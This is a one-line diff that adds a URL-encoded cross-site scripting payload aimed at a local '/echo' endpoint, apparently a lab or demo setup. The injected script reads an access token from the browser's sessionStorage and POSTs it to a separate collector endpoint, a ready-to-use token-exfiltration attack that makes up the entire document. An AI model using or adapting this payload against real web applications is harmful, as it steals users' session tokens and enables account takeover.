@@ -1,0 +1,1 @@
+http://localhost:8080/echo?value=%3Cscript%3E%20fetch(%27http://localhost:9090/collect%27,%20%7Bmethod:%20%27POST%27,%20headers:%20%7B%27Content-Type%27:%20%27application/json%27%7D,%20body:%20JSON.stringify(%7Bvalue:%20sessionStorage.getItem(%27accessToken%27)%7D)%7D)%20%3C/script%3E
